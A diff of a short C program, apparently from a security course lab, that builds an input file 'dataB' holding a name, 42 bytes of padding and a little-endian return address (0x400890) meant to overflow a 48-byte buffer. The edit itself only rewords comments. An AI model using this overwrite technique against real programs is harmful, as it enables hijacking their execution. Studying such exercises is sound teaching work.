@@ -21,18 +21,18 @@ int main(void) {
     
     fp = fopen("dataB", "wb");
     
-    /* Write student name */
+    /* write name */
     fwrite("Kevin", 1, 5, fp);
     
-    /* Write null terminator */
+    /* write null terminator */
     fputc('\0', fp);
     
-    /* Write padding to fill remaining buf space (48 - 6 = 42 bytes) */
+    /* padding to fill remaining buf space (48 - 6 = 42 bytes) */
     for (i = 0; i < 42; i++) {
         fputc('A', fp);  /* Arbitrary padding character */
     }
     
-    /* Write target address 0x400890 in little-endian format */
+    /* write target address 0x400890 in little-endian format */
     target_addr = 0x400890;
     fwrite(&target_addr, sizeof(target_addr), 1, fp);
     
